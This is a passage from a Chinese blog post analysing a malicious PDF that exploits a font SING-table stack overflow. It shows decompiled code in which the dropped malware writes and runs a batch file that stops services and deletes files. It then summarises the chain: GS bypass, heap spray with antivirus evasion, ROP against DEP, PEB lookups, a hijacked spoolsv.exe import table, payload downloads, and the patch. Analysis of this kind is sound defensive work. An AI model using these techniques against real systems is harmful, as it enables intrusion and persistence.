<span class="number">0xC0000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x10000080</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( FileA != (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="built_in">sizeof</span>(v11));</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">wsprintfA</span>(v11, <span class="string">&quot;net stop \&quot;%s\&quot;\r\nnet stop \&quot;%s\&quot;\r\ndel \&quot;%s\&quot; \r\n&quot;</span>, a1, a1, Buffer);</span><br><span class="line">    NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteFile</span>(FileA, v11, <span class="built_in">strlen</span>(v11), &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(FileA);</span><br><span class="line">    <span class="built_in">ShellExecuteA</span>(<span class="number">0</span>, <span class="string">&quot;open&quot;</span>, Buffer, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">0x1388</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后就不再细讲 写了没什么意义(我不会)，总的来说就是，<code>svrhost.exe</code>文件会在系统目录下生成其他病毒文件，同时篡改系统文件，然后也会创建一系列bat批处理文件，要么是关闭服务，要么是删除自身以及病毒痕迹，或者说是加载恶意DLL，而该注入的恶意DLL文件就是msxml0r.dll文件.<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/1ad5ad6eddc451daea701121f3fd5266d1163271.jpg"
                     
                ></p>
<p>经过PECompact加壳处理，他会得到3个URL地址然后不断发送HTTP请求，下载3个gif文件，可以猜测这三个gif文件中包含一些PE数据，用来执行恶意操作。最后<code>shellcode</code>将会把PDF样本修改为正常文件，也就是删除了TTF字体的<code>SING</code>表。</p>
<p>可以看到PDF正常打开<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/9825bc315c6034a8716aa54b8e1349540823766b.jpg"
                     
                ></p>
<p>整个恶意PDF文件流程为：<code>漏洞利用PDF内容</code>→<code>恶意PE文件</code>→<code>正常PDF内容</code></p>
<h2 id="8-整体过程"><a href="#8-整体过程" class="headerlink" title="8.整体过程"></a>8.整体过程</h2><p>花了好久把漏洞利用这部分搞明白了，总体流程归结于如下几点：</p>
<ol>
<li><code>strcat</code>函数可以通过<code>SING</code>表的<code>uniqueName</code>字段来进行栈溢出</li>
<li>通过覆盖栈上的函数指针而不是返回值，使得后续调用该指针来绕过<code>GS</code>，也就是<code>canary</code>，然后进行<code>ROP</code></li>
<li>使用<code>heap spray</code>来布置大量相同的<code>shellcode</code>。堆喷的脚本使用随机变量名、\x25替代%号来、添加无用代码来绕过杀毒软件分析</li>
<li>通过<code>ROP</code>来绕过<code>DEP</code>保护，也就是<code>NX</code></li>
<li>其中<code>ROP</code>的构造我们利用未开启<code>ALSR</code>的模块来获取<code>gadget</code>，他的地址一般是固定的</li>
<li>由于<code>uniqueName</code>可能不能太大，防止覆盖程序关键数据，因此使用两次栈迁移来到精准堆喷的地址，0x0c0c0c0c，将漏洞利用程序使用文件映射的一些函数映射到内存，然后将EIP指向他。</li>
<li>通过PEB环境控制块来获取<code>kernel32.dll</code>的基地址，从而获取一些需要运行的函数地址</li>
<li>通过异或和交换字符来对恶意PE文件进行加密</li>
<li>释放并且运行<code>svchost.exe</code>恶意文件，文件名同系统进程名一致，增加隐蔽性</li>
<li>提升权限，关闭系统文件保护，用来修改系统文件</li>
<li>修改打印服务程序<code>spoolsv.exe</code>的导入表，使得其在启动的时候加载恶意dll程序</li>
<li>修改文件时间等加密隐蔽性，然后运行完程序后，会删除没用的程序防止被发现</li>
<li>利用加壳防止逆向分析</li>
<li>远程下载恶意程序，最后修改恶意样本PDF文件为正常PDF并打开，假装是正常开启。</li>
</ol>
<h2 id="9-漏洞修复"><a href="#9-漏洞修复" class="headerlink" title="9.漏洞修复"></a>9.漏洞修复</h2><p>🎉官方在之后修补该漏洞的时候，添加了字符串长度的检测和限制，用新的函数来替代了<code>strcat</code>函数，这样就避免了在栈上构造虚假函数指针🎉</p>
<h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10.总结"></a>10.总结</h2><p>一个pdf文件就像一个exe文件一样，都是最终输出格式却总有人认为它们和word是一类编辑文档</p>
<p>(事实上word这类编辑文档也可以注入病毒，不过更多的是用来激活🙂，例如使用LLDB动态调试可以激活office365套件)。</p>

            </div>

            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/%E9%80%86%E5%90%91/">#逆向</a>&nbsp;
                        </li>
                    
                </ul>
            

            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                            rel="prev"
                            href="/2023/06/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"
                            >
                                <span class="left arrow-icon flex-center">
                                    <i class="fa-solid fa-chevron-left"></i>
                                </span>
                                <span class="title flex-center">
                                    <span class="post-nav-title-item">博客搭建教程</span>
                                    <span class="post-nav-item">上一篇</span>
                                </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                            rel="next"
                            href="/2023/05/13/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E8%BD%AF%E4%BB%B6%E6%94%B6%E8%B4%B9/"
                            >
                                <span class="title flex-center">
                                    <span class="post-nav-title-item">如何绕过软件收费</span>
                                    <span class="post-nav-item">下一篇</span>
                                </span>
                                <span class="right arrow-icon flex-center">
                                    <i class="fa-solid fa-chevron-right"></i>
                                </span>
                            </a>
                        </div>
                    
                </div>
            


            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">此页目录</div>
        <div class="page-title">当PDF来敲门</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%91%E7%9A%84%E4%B8%80%E4%B8%AA%E6%9C%8B%E5%8F%8B%E7%B3%BB%E5%88%97"><span class="nav-text">我的一个朋友系列</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-text">2.漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">3.基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="nav-text">4.发现漏洞点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%EF%BC%88%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%89"><span class="nav-text">5.样本分析（栈溢出）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-GS%E4%BF%9D%E6%8A%A4"><span class="nav-text">1.GS保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-DEP-Data-Excution-Prevention-%E6%95%B0%E6%8D%AE%E6%89%A7%E8%A1%8C%E4%BF%9D%E6%8A%A4"><span class="nav-text">2.DEP(Data Excution Prevention)数据执行保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-ALSR"><span class="nav-text">3.ALSR</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%EF%BC%88%E9%98%B6%E6%AE%B5%E4%BA%8C%EF%BC%9AROP%E9%93%BE%EF%BC%89"><span class="nav-text">5.样本分析（阶段二：ROP链）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E5%A0%86%E5%96%B7-Heap-Spray"><span class="nav-text">6.堆喷(Heap Spray)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-text">7.恶意样本分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E6%95%B4%E4%BD%93%E8%BF%87%E7%A8%8B"><span class="nav-text">8.整体过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">9.漏洞修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%E6%80%BB%E7%BB%93"><span class="nav-text">10.总结</span></a></li></ol></li></ol>

    </div>
</div>
            </div>
        
    </div>
</div>


                

            </div>
            
            

        </div>

        <div class="main-content-footer">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info">
            &copy;
            
              <span>2023</span>
              -
            
            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Chieh</a>
        </div>
        
            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
                <br>
            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.3</a>
        </div>
        
        
        
            <div id="start_div" style="display:none">
                2023/5/11 00:00:00
            </div>
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
        
            <script async data-pjax>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-expand-width flex-center">
            <i class="fa-regular fa-expand"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="right-bottom-tools tool-scroll-to-top flex-center">
                <i class="fa-regular fa-arrow-up"></i>
            </li>
        

        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fa-solid fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fa-solid fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    


</main>



<script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/utils.js"></script><script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/main.js"></script><script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/layouts/navbarShrink.js"></script><script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/tools/scrollTopBottom.js"></script><script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/tools/lightDarkSwitch.js"></script>


    <script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/tools/localSearch.js"></script>



    <script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/tools/codeBlock.js"></script>



    <script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/layouts/lazyload.js"></script>



    <script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/tools/runtime.js"></script>
    <script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/layouts/odometer.min.js"></script>
    <link rel="stylesheet" href="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/assets/odometer-theme-minimal.css">



  <script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/libs/Typed.min.js"></script>
  <script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/plugins/typed.js"></script>







<div class="post-scripts pjax">
    
        <script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/tools/tocToggle.js"></script><script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/libs/anime.min.js"></script><script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/layouts/toc.js"></script><script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/plugins/tabs.js"></script>
    
</div>


    <script src="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax',
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            Global.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            Global.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            Global.refresh();
        });
    });
</script>




</body>
</html>
